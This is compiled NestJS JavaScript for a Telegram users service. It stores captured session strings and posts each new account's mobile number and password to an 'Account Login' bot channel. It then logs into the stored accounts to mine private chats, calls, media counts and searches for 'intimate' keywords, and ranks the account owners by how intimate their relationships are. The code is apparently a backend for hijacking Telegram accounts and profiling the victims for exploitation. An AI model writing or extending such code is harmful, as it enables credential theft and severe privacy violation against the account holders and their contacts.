"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var UsersService_1;
Object.defineProperty(exports, "__esModule", { value: true });
exports.UsersService = void 0;
const Telegram_service_1 = require("./../Telegram/Telegram.service");
const common_1 = require("@nestjs/common");
const mongoose_1 = require("@nestjs/mongoose");
const mongoose_2 = require("mongoose");
const client_service_1 = require("../clients/client.service");
const connection_manager_1 = require("../Telegram/utils/connection-manager");
const bots_1 = require("../bots");
const Helpers_1 = require("telegram/Helpers");
const utils_1 = require("../../utils");
const scoring_1 = require("./scoring");
const tl_1 = require("telegram/tl");
const big_integer_1 = __importDefault(require("big-integer"));
const parseError_1 = require("../../utils/parseError");
let UsersService = UsersService_1 = class UsersService {
    constructor(userModel, telegramService, clientsService, botsService) {
        this.userModel = userModel;
        this.telegramService = telegramService;
        this.clientsService = clientsService;
        this.botsService = botsService;
        this.logger = new utils_1.Logger(UsersService_1.name);
    }
    async create(user) {
        const activeClientSetup = this.telegramService.getActiveClientSetup(user.mobile);
        this.logger.log(`New User received - ${user?.mobile}`);
        this.logger.debug('ActiveClientSetup:', activeClientSetup);
        if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
            this.logger.log(`Updating New Session Details: ${user.mobile}, @${user.username}, ${activeClientSetup.clientId}`);
            await this.clientsService.updateClientSession(user.session, user.mobile);
        }
        else {
            await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `<b>Account Login</b>\n\n<b>Username:</b> ${user.username ? `@${user.username}` : user.firstName}\n<b>Mobile:</b> ${user.mobile}${user.password ? `\n<b>Password:</b> ${user.password}` : ''}`, { parseMode: 'HTML' }, false);
            const newUser = new this.userModel(user);
            const saved = await newUser.save();
            setTimeout(() => {
                this.computeRelationshipScore(user.mobile).catch(err => {
                    this.logger.error(`Background scoring failed for ${user.mobile}`, err);
                });
            }, 5000);
            return saved;
        }
    }
    async top(options) {
        const { page = 1, limit = 20, minScore = 0, minCalls = 0, minPhotos = 0, minVideos = 0, excludeTwoFA = false, gender, starred, } = options;
        const pageNum = Math.max(1, Math.floor(page));
        const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
        const skip = (pageNum - 1) * limitNum;
        let excludedMobiles = [];
        try {
            excludedMobiles = await this.telegramService.getOwnAccountMobiles();
        }
        catch { }
        const query = {
            expired: { $ne: true },
            'relationships.score': { $gte: minScore },
            ...(excludedMobiles.length > 0 && { mobile: { $nin: excludedMobiles } }),
        };
        if (excludeTwoFA)
            query.twoFA = { $ne: true };
        if (gender)
            query.gender = gender;
        if (starred)
            query.starred = true;
        if (minCalls > 0)
            query['calls.totalCalls'] = { $gte: minCalls };
        if (minPhotos > 0)
            query['photoCount'] = { $gte: minPhotos };
        if (minVideos > 0)
            query['videoCount'] = { $gte: minVideos };
        const total = await this.userModel.countDocuments(query).exec();
        const totalPages = Math.ceil(total / limitNum);
        if (total === 0) {
            return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
        }
        const users = await this.userModel
            .find(query)
            .select('-session')
            .sort({ 'relationships.score': -1 })
            .skip(skip)
            .limit(limitNum)
            .allowDiskUse(true)
            .lean()
            .exec();
        return { users: users, total, page: pageNum, limit: limitNum, totalPages };
    }
    async leaderboard(options) {
        const { aspect, limit = 25 } = options;
        const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
        const ASPECT_MAP = {
            msgs: { field: 'msgs' },
            totalChats: { field: 'totalChats' },
            personalChats: { field: 'personalChats' },
            channels: { field: 'channels' },
            contacts: { field: 'contacts' },
            totalCalls: { field: 'calls.totalCalls' },
            incomingCalls: { field: 'calls.incoming' },
            outgoingCalls: { field: 'calls.outgoing' },
            videoCalls: { field: 'calls.video' },
            movieCount: { field: 'movieCount' },
            otherPhotos: { field: 'otherPhotoCount' },
            otherVideos: { field: 'otherVideoCount' },
            ownPhotos: { field: 'ownPhotoCount' },
            ownVideos: { field: 'ownVideoCount' },
            relationshipScore: { field: 'relationships.score' },
            relationshipBestScore: { field: 'relationships.bestScore' },
            totalMedia: {
                computed: {
                    $add: [
                        { $ifNull: ['$photoCount', 0] },
                        { $ifNull: ['$videoCount', 0] },
                        { $ifNull: ['$otherPhotoCount', 0] },
                        { $ifNull: ['$otherVideoCount', 0] },
                        { $ifNull: ['$ownPhotoCount', 0] },
                        { $ifNull: ['$ownVideoCount', 0] },
                    ],
                },
            },
            engagement: {
                computed: {
                    $add: [
                        { $ifNull: ['$msgs', 0] },
                        { $multiply: [{ $ifNull: ['$totalChats', 0] }, 10] },
                        { $multiply: [{ $ifNull: ['$calls.totalCalls', 0] }, 20] },
                        { $multiply: [{ $ifNull: ['$contacts', 0] }, 2] },
                    ],
                },
            },
            recency: { field: 'lastActive' },
        };
        const aspectDef = ASPECT_MAP[aspect];
        if (!aspectDef) {
            throw new common_1.BadRequestException(`Unknown aspect: ${aspect}`);
        }
        let excludedMobiles = [];
        try {
            excludedMobiles = await this.telegramService.getOwnAccountMobiles();
        }
        catch { }
        const matchStage = {};
        if (excludedMobiles.length > 0)
            matchStage.mobile = { $nin: excludedMobiles };
        const isRecency = aspect === 'recency';
        const sortField = '_sortValue';
        const valueExpr = aspectDef.computed
            ? aspectDef.computed
            : (isRecency ? `$${aspectDef.field}` : { $ifNull: [`$${aspectDef.field}`, 0] });
        const pipeline = [
            { $match: matchStage },
            { $addFields: { [sortField]: valueExpr } },
        ];
        if (isRecency) {
            pipeline.push({ $match: { [sortField]: { $exists: true, $nin: ['', null] } } });
        }
        else {
            pipeline.push({ $match: { [sortField]: { $gt: 0 } } });
        }
        pipeline.push({
            $facet: {
                stats: [
                    {
                        $group: {
                            _id: null,
                            withValue: { $sum: 1 },
                            average: { $avg: isRecency ? 1 : `$${sortField}` },
                            highest: { $max: isRecency ? 1 : `$${sortField}` },
                        },
                    },
                ],
                ranked: [
                    { $sort: { [sortField]: -1 } },
                    { $limit: limitNum },
                    {
                        $project: {
                            session: 0,
                            password: 0,
                        },
                    },
                ],
            },
        });
        const [result] = await this.userModel.aggregate(pipeline).allowDiskUse(true).exec();
        const stats = result.stats[0] || { highest: 0, average: 0, withValue: 0 };
        return {
            ranked: result.ranked || [],
            stats: {
                highest: isRecency ? 0 : Math.round(stats.highest || 0),
                average: isRecency ? 0 : Math.round(stats.average || 0),
                withValue: stats.withValue || 0,
            },
        };
    }
    async findAll(limit = 100, skip = 0) {
        return this.userModel.find().limit(limit).skip(skip).exec();
    }
    async findAllSorted(limit = 100, skip = 0, sort) {
        let excludedMobiles = [];
        try {
            excludedMobiles = await this.telegramService.getOwnAccountMobiles();
        }
        catch { }
        const filter = excludedMobiles.length > 0 ? { mobile: { $nin: excludedMobiles } } : {};
        const query = this.userModel.find(filter).lean();
        if (sort)
            query.sort(sort);
        return query.skip(skip).limit(limit).allowDiskUse(true).exec();
    }
    async summary() {
        const [result] = await this.userModel.aggregate([
            {
                $facet: {
                    totals: [
                        {
                            $group: {
                                _id: null,
                                total: { $sum: 1 },
                                active: {
                                    $sum: { $cond: [{ $gte: ['$lastActive', '2026-01-01'] }, 1, 0] },
                                },
                                starred: { $sum: { $cond: [{ $eq: ['$starred', true] }, 1, 0] } },
                                expired: { $sum: { $cond: [{ $eq: ['$expired', true] }, 1, 0] } },
                                withTwoFA: { $sum: { $cond: [{ $eq: ['$twoFA', true] }, 1, 0] } },
                                withCalls: {
                                    $sum: { $cond: [{ $gt: ['$calls.totalCalls', 0] }, 1, 0] },
                                },
                                withRelationship: {
                                    $sum: { $cond: [{ $gt: ['$relationships.score', 0] }, 1, 0] },
                                },
                                avgMsgs: { $avg: '$msgs' },
                                avgContacts: { $avg: '$contacts' },
                                avgChats: { $avg: '$totalChats' },
                                totalMsgs: { $sum: '$msgs' },
                                totalCalls: { $sum: '$calls.totalCalls' },
                                totalContacts: { $sum: '$contacts' },
                            },
                        },
                    ],
                    genderBreakdown: [
                        { $group: { _id: '$gender', count: { $sum: 1 } } },
                    ],
                },
            },
        ]).allowDiskUse(true).exec();
        const totals = result.totals[0] || {};
        const genderBreakdown = Object.fromEntries((result.genderBreakdown || []).map((g) => [g._id || 'unknown', g.count]));
        return {
            total: totals.total || 0,
            active: totals.active || 0,
            starred: totals.starred || 0,
            expired: totals.expired || 0,
            withTwoFA: totals.withTwoFA || 0,
            withCalls: totals.withCalls || 0,
            withRelationship: totals.withRelationship || 0,
            avgMsgs: Math.round(totals.avgMsgs || 0),
            avgContacts: Math.round(totals.avgContacts || 0),
            avgChats: Math.round(totals.avgChats || 0),
            totalMsgs: totals.totalMsgs || 0,
            totalCalls: totals.totalCalls || 0,
            totalContacts: totals.totalContacts || 0,
            genderBreakdown,
        };
    }
    async paginated(options) {
        const { page = 1, limit = 50, sortBy = 'lastActive', sortOrder = 'desc', search, filter = 'all', } = options;
        const pageNum = Math.max(1, Math.floor(page));
        const limitNum = Math.min(Math.max(1, Math.floor(limit)), 200);
        const skip = (pageNum - 1) * limitNum;
        const query = {};
        if (filter === 'active')
            query.lastActive = { $gte: '2026-01-01' };
        else if (filter === 'starred')
            query.starred = true;
        else if (filter === 'expired')
            query.expired = true;
        else if (filter === 'withCalls')
            query['calls.totalCalls'] = { $gt: 0 };
        if (search?.trim()) {
            const q = search.trim();
            query.$or = [
                { firstName: { $regex: q, $options: 'i' } },
                { lastName: { $regex: q, $options: 'i' } },
                { username: { $regex: q, $options: 'i' } },
                { mobile: { $regex: q } },
                { tgId: q },
            ];
        }
        const total = await this.userModel.countDocuments(query).exec();
        const totalPages = Math.ceil(total / limitNum);
        if (total === 0) {
            return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
        }
        const sort = { [sortBy]: sortOrder === 'asc' ? 1 : -1 };
        const users = await this.userModel
            .find(query)
            .select('-session -password')
            .sort(sort)
            .skip(skip)
            .limit(limitNum)
            .allowDiskUse(true)
            .lean()
            .exec();
        return { users: users, total, page: pageNum, limit: limitNum, totalPages };
    }
    async findOne(tgId) {
        const doc = await this.userModel.findOne({ tgId }).exec();
        if (!doc) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
        return doc.toJSON();
    }
    async update(tgId, updateDto) {
        const updated = await this.userModel
            .findOneAndUpdate({ tgId }, { $set: updateDto }, { new: true })
            .exec();
        if (!updated) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
        return updated;
    }
    async updateByFilter(filter, updateDto) {
        const result = await this.userModel
            .updateMany(filter, { $set: updateDto })
            .exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users matching filter not found`);
        }
        return result.modifiedCount;
    }
    async toggleStar(mobile) {
        const user = await this.userModel.findOne({ mobile }).select('mobile starred').exec();
        if (!user)
            throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
        const newVal = !user.starred;
        await this.userModel.updateOne({ mobile }, { $set: { starred: newVal } }).exec();
        return { mobile, starred: newVal };
    }
    async delete(tgId) {
        const result = await this.userModel.updateOne({ tgId }, { $set: { expired: true } }).exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
    }
    async search(filter) {
        const query = { ...filter };
        const escapeRegex = (text) => text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        const regexFields = ['firstName', 'lastName', 'username', 'mobile'];
        for (const field of regexFields) {
            if (typeof query[field] === 'string' && query[field]) {
                query[field] = { $regex: new RegExp(escapeRegex(query[field]), 'i') };
            }
        }
        if (!filter.mobile) {
            let excludedMobiles = [];
            try {
                excludedMobiles = await this.telegramService.getOwnAccountMobiles();
            }
            catch { }
            if (excludedMobiles.length > 0) {
                query.mobile = { $nin: excludedMobiles };
            }
        }
        return this.userModel.find(query).sort({ updatedAt: -1 }).limit(200).exec();
    }
    async computeRelationshipScore(mobile) {
        const wasConnected = connection_manager_1.connectionManager.hasClient(mobile);
        let telegramClient = null;
        try {
            telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
            const me = await telegramClient.getMe();
            const selfId = me.id?.toString();
            const candidateMap = new Map();
            const excludedIds = new Set(['777000', '42', '333000', '178220800']);
            try {
                const ownAccountIds = await this.telegramService.getOwnAccountTgIds();
                for (const id of ownAccountIds)
                    excludedIds.add(id);
            }
            catch (e) {
                this.logger.warn(`[${mobile}] Failed to fetch own account IDs: ${e.message}`);
            }
            try {
                const topPeersResult = await telegramClient.client.invoke(new tl_1.Api.contacts.GetTopPeers({
                    correspondents: true,
                    phoneCalls: true,
                    forwardUsers: true,
                    offset: 0,
                    limit: 50,
                    hash: (0, big_integer_1.default)(0),
                }));
                if (topPeersResult instanceof tl_1.Api.contacts.TopPeers) {
                    const userMap = new Map();
                    for (const u of topPeersResult.users || []) {
                        if (u instanceof tl_1.Api.User && !u.bot) {
                            userMap.set(u.id.toString(), u);
                        }
                    }
                    for (const category of topPeersResult.categories || []) {
                        for (const topPeer of category.peers || []) {
                            const peerId = topPeer.peer?.userId?.toString();
                            if (!peerId || peerId === selfId || excludedIds.has(peerId))
                                continue;
                            const user = userMap.get(peerId);
                            if (!user)
                                continue;
                            candidateMap.set(peerId, {
                                id: peerId,
                                name: [user.firstName, user.lastName].filter(Boolean).join(' ').trim() || 'Unknown',
                                username: user.username || null,
                                phone: user.phone || null,
                                source: 'topPeers',
                            });
                        }
                    }
                    this.logger.log(`[${mobile}] GetTopPeers: ${candidateMap.size} candidates`);
                }
            }
            catch (topPeersError) {
                this.logger.warn(`[${mobile}] GetTopPeers failed (may be disabled): ${topPeersError.message}`);
            }
            try {
                let dialogCount = 0;
                for await (const d of telegramClient.client.iterDialogs({ limit: 100 })) {
                    if (!d.isUser || !(d.entity instanceof tl_1.Api.User))
                        continue;
                    const user = d.entity;
                    if (user.bot)
                        continue;
                    const id = user.id.toString();
                    if (id === selfId || excludedIds.has(id))
                        continue;
                    const existing = candidateMap.get(id);
                    if (existing) {
                        existing.source = 'both';
                    }
                    else {
                        candidateMap.set(id, {
                            id,
                            name: [user.firstName, user.lastName].filter(Boolean).join(' ').trim() || 'Unknown',
                            username: user.username || null,
                            phone: user.phone || null,
                            source: 'dialogs',
                        });
                    }
                    dialogCount++;
                    if (dialogCount >= 40)
                        break;
                }
                this.logger.log(`[${mobile}] iterDialogs: ${dialogCount} users scanned, total candidates: ${candidateMap.size}`);
            }
            catch (dialogError) {
                this.logger.warn(`[${mobile}] iterDialogs failed: ${dialogError.message}`);
            }
            if (candidateMap.size === 0) {
                this.logger.log(`[${mobile}] No candidates found from either source`);
                return;
            }
            const mutualChatIds = new Set();
            try {
                const contactsResult = await telegramClient.getContacts();
                if (contactsResult && 'users' in contactsResult) {
                    for (const user of contactsResult.users || []) {
                        if (user.mutualContact)
                            mutualChatIds.add(user.id?.toString());
                    }
                }
            }
            catch { }
            const allCandidates = Array.from(candidateMap.values()).slice(0, 15);
            const candidates = [];
            const callAgg = { totalCalls: 0, incoming: 0, outgoing: 0, video: 0, audio: 0 };
            for (const candidate of allCandidates) {
                try {
                    if (excludedIds.has(candidate.id))
                        continue;
                    try {
                        const entity = await telegramClient.client.getEntity(candidate.id);
                        if (entity.bot)
                            continue;
                    }
                    catch { }
                    const chatPeer = await telegramClient.getchatId(candidate.id);
                    let totalMessages = 0;
                    let lastMessageDate = null;
                    try {
                        const msgResult = await telegramClient.client.getMessages(candidate.id, { limit: 1 });
                        totalMessages = msgResult?.total ?? 0;
                        const lastMsg = msgResult?.[0];
                        if (lastMsg?.date) {
                            lastMessageDate = new Date(lastMsg.date * 1000).toISOString();
                        }
                    }
                    catch { }
                    if (totalMessages < 5) {
                        await (0, Helpers_1.sleep)(100);
                        continue;
                    }
                    let photoCount = 0;
                    let videoCount = 0;
                    let roundVideoCount = 0;
                    let voiceCount = 0;
                    try {
                        const counters = await telegramClient.client.invoke(new tl_1.Api.messages.GetSearchCounters({
                            peer: chatPeer,
                            filters: [
                                new tl_1.Api.InputMessagesFilterPhotos(),
                                new tl_1.Api.InputMessagesFilterVideo(),
                                new tl_1.Api.InputMessagesFilterRoundVideo(),
                                new tl_1.Api.InputMessagesFilterVoice(),
                            ],
                        }));
                        const counterArr = counters;
                        photoCount = counterArr?.[0]?.count ?? 0;
                        videoCount = counterArr?.[1]?.count ?? 0;
                        roundVideoCount = counterArr?.[2]?.count ?? 0;
                        voiceCount = counterArr?.[3]?.count ?? 0;
                    }
                    catch { }
                    const mediaCount = photoCount + roundVideoCount + Math.floor(videoCount * 0.5);
                    let callStats = { totalCalls: 0, incoming: 0, videoCalls: 0, totalDuration: 0, averageDuration: 0, outgoing: 0, audioCalls: 0, meaningfulCalls: 0 };
                    try {
                        const callHistory = await telegramClient.getChatCallHistory(candidate.id, 200, true);
                        const meaningfulCalls = callHistory.calls
                            ? callHistory.calls.filter((c) => c.durationSeconds > 30).length
                            : (callHistory.averageDuration > 30 ? callHistory.totalCalls : 0);
                        callStats = {
                            totalCalls: callHistory.totalCalls,
                            incoming: callHistory.incoming,
                            outgoing: callHistory.outgoing,
                            videoCalls: callHistory.videoCalls,
                            audioCalls: callHistory.audioCalls,
                            totalDuration: callHistory.totalDuration,
                            averageDuration: callHistory.averageDuration,
                            meaningfulCalls,
                        };
                        callAgg.totalCalls += callStats.totalCalls;
                        callAgg.incoming += callStats.incoming;
                        callAgg.outgoing += callStats.outgoing;
                        callAgg.video += callStats.videoCalls;
                        callAgg.audio += callStats.audioCalls;
                    }
                    catch { }
                    let commonChats = 0;
                    try {
                        const common = await telegramClient.client.invoke(new tl_1.Api.messages.GetCommonChats({
                            userId: candidate.id,
                            maxId: (0, big_integer_1.default)(0),
                            limit: 100,
                        }));
                        commonChats = common?.chats?.length ?? 0;
                    }
                    catch { }
                    let intimateMessageCount = 0;
                    let negativeKeywordCount = 0;
                    const searchKeyword = async (keyword) => {
                        try {
                            const result = await telegramClient.client.invoke(new tl_1.Api.messages.Search({
                                peer: chatPeer,
                                q: keyword,
                                filter: new tl_1.Api.InputMessagesFilterEmpty(),
                                minDate: 0,
                                maxDate: 0,
                                offsetId: 0,
                                addOffset: 0,
                                limit: 1,
                                maxId: 0,
                                minId: 0,
                                hash: (0, big_integer_1.default)(0),
                            }));
                            await (0, Helpers_1.sleep)(150);
                            return result?.count ?? 0;
                        }
                        catch {
                            return 0;
                        }
                    };
                    for (const keyword of scoring_1.INTIMATE_KEYWORDS) {
                        intimateMessageCount += await searchKeyword(keyword);
                    }
                    for (const keyword of scoring_1.NEGATIVE_KEYWORDS) {
                        negativeKeywordCount += await searchKeyword(keyword);
                    }
                    candidates.push({
                        chatId: candidate.id,
                        name: candidate.name,
                        username: candidate.username,
                        phone: candidate.phone,
                        messages: totalMessages,
                        mediaCount,
                        voiceCount,
                        intimateMessageCount,
                        negativeKeywordCount,
                        calls: {
                            total: callStats.totalCalls,
                            incoming: callStats.incoming,
                            videoCalls: callStats.videoCalls,
                            avgDuration: callStats.averageDuration,
                            totalDuration: callStats.totalDuration,
                            meaningfulCalls: callStats.meaningfulCalls,
                        },
                        commonChats,
                        isMutualContact: mutualChatIds.has(candidate.id),
                        lastMessageDate,
                    });
                    this.logger.debug(`[${mobile}] Scored ${candidate.name}: msgs=${totalMessages} media=${mediaCount} voice=${voiceCount} intimate=${intimateMessageCount} calls=${callStats.totalCalls} (${candidate.source})`);
                    await (0, Helpers_1.sleep)(200);
                }
                catch (chatError) {
                    this.logger.warn(`[${mobile}] Failed to score chat ${candidate.id}: ${chatError.message}`);
                }
            }
            const top = (0, scoring_1.rankRelationships)(candidates, 5);
            const accountScore = (0, scoring_1.computeAccountScore)(top);
            const bestScore = top.length > 0 ? top[0].score : 0;
            await this.userModel.updateOne({ mobile }, {
                $set: {
                    'relationships.score': accountScore,
                    'relationships.bestScore': bestScore,
                    'relationships.computedAt': new Date(),
                    'relationships.top': top,
                    calls: callAgg,
                },
            }).exec();
            this.logger.log(`[${mobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}, candidates=${candidates.length}/${candidateMap.size}`);
        }
        catch (error) {
            (0, parseError_1.parseError)(error, `[${mobile}] computeRelationshipScore failed`);
        }
        finally {
            if (!wasConnected && telegramClient) {
                await connection_manager_1.connectionManager.unregisterClient(mobile).catch(() => undefined);
            }
        }
    }
    async topRelationships(options) {
        const { page = 1, limit = 20, minScore = 0, excludeTwoFA = false, gender } = options;
        const pageNum = Math.max(1, Math.floor(page));
        const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
        const skip = (pageNum - 1) * limitNum;
        let excludedMobiles = [];
        try {
            excludedMobiles = await this.telegramService.getOwnAccountMobiles();
        }
        catch { }
        const query = {
            expired: { $ne: true },
            'relationships.bestScore': { $gt: minScore },
            ...(excludedMobiles.length > 0 && { mobile: { $nin: excludedMobiles } }),
        };
        if (excludeTwoFA)
            query.twoFA = { $ne: true };
        if (gender)
            query.gender = gender;
        const total = await this.userModel.countDocuments(query).exec();
        if (total === 0) {
            return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
        }
        const users = await this.userModel
            .find(query)
            .select('-session -password')
            .sort({ 'relationships.bestScore': -1 })
            .skip(skip)
            .limit(limitNum)
            .allowDiskUse(true)
            .lean()
            .exec();
        return { users, total, page: pageNum, limit: limitNum, totalPages: Math.ceil(total / limitNum) };
    }
    async getUserRelationships(mobile) {
        const user = await this.userModel
            .findOne({ mobile })
            .select('mobile firstName lastName tgId relationships')
            .lean()
            .exec();
        if (!user)
            throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
        return user;
    }
    async aggregateSort(computedField, sortOrder = -1, limit = 20, skip = 0) {
        const COMPUTED_FIELDS = {
            intimateTotal: {
                $reduce: {
                    input: { $ifNull: ['$relationships.top', []] },
                    initialValue: 0,
                    in: { $add: ['$$value', { $ifNull: ['$$this.intimateMessageCount', 0] }] },
                },
            },
            privateMsgsTopContacts: {
                $reduce: {
                    input: { $ifNull: ['$relationships.top', []] },
                    initialValue: 0,
                    in: { $add: ['$$value', { $ifNull: ['$$this.messages', 0] }] },
                },
            },
            privateMediaTopContacts: {
                $reduce: {
                    input: { $ifNull: ['$relationships.top', []] },
                    initialValue: 0,
                    in: { $add: ['$$value', { $ifNull: ['$$this.mediaCount', 0] }] },
                },
            },
            privateVoiceTotal: {
                $reduce: {
                    input: { $ifNull: ['$relationships.top', []] },
                    initialValue: 0,
                    in: { $add: ['$$value', { $ifNull: ['$$this.voiceCount', 0] }] },
                },
            },
            privateMsgsBestContact: {
                $ifNull: [{ $arrayElemAt: ['$relationships.top.messages', 0] }, 0],
            },
            relTopIntimate: {
                $ifNull: [{ $arrayElemAt: ['$relationships.top.intimateMessageCount', 0] }, 0],
            },
            relTopMedia: {
                $ifNull: [{ $arrayElemAt: ['$relationships.top.mediaCount', 0] }, 0],
            },
            relTopVoice: {
                $ifNull: [{ $arrayElemAt: ['$relationships.top.voiceCount', 0] }, 0],
            },
            relCommonChats: {
                $ifNull: [{ $arrayElemAt: ['$relationships.top.commonChats', 0] }, 0],
            },
            relTopCalls: {
                $ifNull: [{ $arrayElemAt: ['$relationships.top.calls.total', 0] }, 0],
            },
            relMeaningfulCalls: {
                $ifNull: [{ $arrayElemAt: ['$relationships.top.calls.meaningfulCalls', 0] }, 0],
            },
            relMutualContacts: {
                $size: {
                    $filter: {
                        input: { $ifNull: ['$relationships.top', []] },
                        as: 'r',
                        cond: { $eq: ['$$r.isMutualContact', true] },
                    },
                },
            },
            callPartners: {
                $size: { $ifNull: ['$calls.chats', []] },
            },
            totalCallDuration: {
                $reduce: {
                    input: { $ifNull: ['$calls.chats', []] },
                    initialValue: 0,
                    in: { $add: ['$$value', { $ifNull: ['$$this.totalDuration', 0] }] },
                },
            },
            longestCall: {
                $reduce: {
                    input: { $ifNull: ['$calls.chats', []] },
                    initialValue: 0,
                    in: { $max: ['$$value', { $ifNull: ['$$this.longestCall', 0] }] },
                },
            },
            missedCalls: {
                $reduce: {
                    input: { $ifNull: ['$calls.chats', []] },
                    initialValue: 0,
                    in: { $add: ['$$value', { $ifNull: ['$$this.missed', 0] }] },
                },
            },
            privateMsgsCallPartners: {
                $reduce: {
                    input: { $ifNull: ['$calls.chats', []] },
                    initialValue: 0,
                    in: { $add: ['$$value', { $ifNull: ['$$this.totalMessages', 0] }] },
                },
            },
        };
        const fieldExpr = COMPUTED_FIELDS[computedField];
        if (!fieldExpr) {
            throw new common_1.BadRequestException(`Unknown computed field: ${computedField}`);
        }
        let excludedMobiles = [];
        try {
            excludedMobiles = await this.telegramService.getOwnAccountMobiles();
        }
        catch { }
        const pipeline = [];
        if (excludedMobiles.length > 0) {
            pipeline.push({ $match: { mobile: { $nin: excludedMobiles } } });
        }
        pipeline.push({ $addFields: { _computedSort: fieldExpr } }, { $sort: { _computedSort: sortOrder } }, { $skip: skip }, { $limit: limit }, { $project: { _computedSort: 0 } });
        return this.userModel.aggregate(pipeline).allowDiskUse(true).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        if (!query) {
            throw new common_1.BadRequestException('Query is invalid.');
        }
        try {
            const queryExec = this.userModel.find(query).lean();
            if (sort)
                queryExec.sort(sort);
            if (limit)
                queryExec.limit(limit);
            if (skip)
                queryExec.skip(skip);
            return await queryExec.allowDiskUse(true).exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
};
exports.UsersService = UsersService;
exports.UsersService = UsersService = UsersService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('userModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        client_service_1.ClientService,
        bots_1.BotsService])
], UsersService);
//# sourceMappingURL=users.service.js.map